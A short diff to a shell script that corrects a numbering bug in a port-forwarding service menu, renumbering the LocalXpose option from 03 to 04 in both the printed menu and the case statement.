@@ -587,7 +587,7 @@ echo -e " "
 echo -e "${RED}[${WHITE}01${RED}]${ORANGE} Localhost    ${RED}[${CYAN}For Devs${RED}]"
 echo -e "${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io     ${RED}[${CYAN}Need to create account${RED}]"
 echo -e "${RED}[${WHITE}03${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]"
-echo -e "${RED}[${WHITE}03${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}Max 15 mins${RED}]"
+echo -e "${RED}[${WHITE}04${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}Max 15 mins${RED}]"
 
         read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"
 
@@ -598,7 +598,7 @@ echo -e "${RED}[${WHITE}03${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}Max 15 min
                         start_ngrok;;
                 3 | 03)
                         start_cloudflared;;
-		3 | 03)
+		4 | 04)
                         start_loclx;;
                 *)
                         echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
